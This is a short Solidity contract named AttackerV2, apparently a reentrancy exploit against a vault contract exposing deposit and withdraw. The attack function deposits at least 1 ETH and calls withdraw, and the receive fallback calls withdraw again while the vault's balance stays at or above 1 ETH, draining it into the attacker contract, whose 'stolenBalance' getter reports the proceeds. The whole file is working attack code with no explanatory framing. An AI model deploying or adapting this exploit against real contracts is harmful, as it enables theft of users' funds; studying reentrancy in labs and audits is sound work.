// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
 
interface ISecureVault {
    function deposit() external payable;
    function withdraw() external;
}
 
contract AttackerV2 {
    ISecureVault public vault;
    address public owner;
 
    constructor(address _vaultAddress) {
        vault = ISecureVault(_vaultAddress);
        owner = msg.sender;
    }
 
    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH to start");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }
 
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
 
    function stolenBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
